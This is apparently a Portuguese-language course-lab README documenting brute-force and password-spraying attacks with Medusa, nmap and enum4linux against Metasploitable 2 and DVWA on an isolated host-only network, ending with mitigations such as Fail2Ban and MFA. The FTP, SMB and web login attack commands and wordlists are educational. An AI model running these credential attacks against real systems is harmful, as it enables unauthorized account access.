# desafio-medusa-dio
Auditoria de Segurança com Medusa:  Simulação de Ataques de Força Bruta.
Este projeto documenta a implementação de um laboratório de testes de penetração controlado. O foco é auditar serviços em um ambiente vulnerável (Metasploitable 2) para demonstrar tecnicamente como ataques de força bruta ocorrem e como implementar medidas de mitigação eficazes.
[!IMPORTANT]AVISO ÉTICO: O conteúdo deste repositório tem finalidade puramente educacional e de conformidade com as práticas de Ethical Hacking. O uso dessas técnicas em sistemas sem autorização prévia é ilegal.

🛠️ Configuração do Ambiente:
Para garantir a segurança do host e evitar tráfego indesejado na rede real, utilizamos uma arquitetura de rede isolada.
Hipervisor: VirtualBoxAtacante: 
Kali Linux (IP: 192.168.56.101)
Alvo: Metasploitable 2 (IP: 192.168.56.102)
Rede: Host-Only (Isolamento total)

🔍 Fases do Projeto:
1. Enumeração e Preparação:
Antes do ataque, realizamos a descoberta de serviços ativos e preparamos as wordlists.

Bash
# Verificando serviços ativos no alvo
nmap -sV 192.168.56.102

# Criando listas de usuários e senhas
echo -e "admin\nuser\nmsfadmin\nroot" > users.txt
echo -e "123456\npassword\nmsfadmin\nqwerty\nadmin123" > passwords.txt

2. Execução dos Ataques:
A. Força Bruta em FTP (Porta 21):
O Medusa foi utilizado para testar combinações contra o serviço de transferência de arquivos.

Bash
# Ataque via Medusa
medusa -h 192.168.56.102 -U users.txt -P passwords.txt -M ftp

# Validação do acesso
ftp 192.168.56.102
# Credenciais obtidas: msfadmin / msfadmin

B. Password Spraying em SMB (Porta 445):
Técnica utilizada para evitar bloqueio de contas ao testar uma senha comum contra múltiplos usuários.

Bash
# Enumeração de usuários via SMB
enum4linux -a 192.168.56.102 | tee enum4linux_out.txt

# Execução do Password Spraying
medusa -h 192.168.56.102 -U smb_users.txt -P senhas_spray.txt -M smbnt -t 2 -T 50

C. Ataque a Formulário Web (DVWA):
Simulação de ataque contra a interface administrativa do Damn Vulnerable Web Application.

Bash
# Criando a lista de usuários
echo -e “admin\nuser\nmsfadmin\nroot” > dvwa_users.txt

# Criando a lista de senhas
echo -e “password\n123456\nqwerty\nmsfadmin” > senhas_dvwa.txt

# Tentando obter as credenciais válidas para o acesso ao painel do DVWA
medusa -h 192.168.56.102 -U dvwa_users.txt -P senhas_dvwa.txt -M http -t 6

📊 Matriz de ValidaçãoVetor de AtaqueFerramentaResultado EsperadoValidaçãoFTPMedusa (-M ftp)Sucesso: msfadmin:msfadminftp 192.168.56.102SMBMedusa (-M smbnt)Identificação de conta válidasmbclient -L //192.168.56.102HTTP FormMedusa (-M http)Login no painel administrativoAcesso via Browser no Kali🛡️ Medidas de Prevenção e MitigaçãoPara proteger ambientes reais contra as técnicas exercitadas neste laboratório, recomenda-se:Políticas de Bloqueio (Account Lockout): Implementar ferramentas como o Fail2Ban para bloquear IPs após 3 a 5 tentativas falhas.Autenticação Multi-Fator (MFA): Essencial para invalidar ataques de Password Spraying.Complexidade de Senhas: Exigir políticas de senhas fortes para tornar wordlists genéricas ineficazes.Desativação de Protocolos Inseguros: Substituir FTP por SFTP/SSH e desativar SMBv1.Monitoramento: Configurar alertas para picos de erros 401 Unauthorized nos logs do servidor.
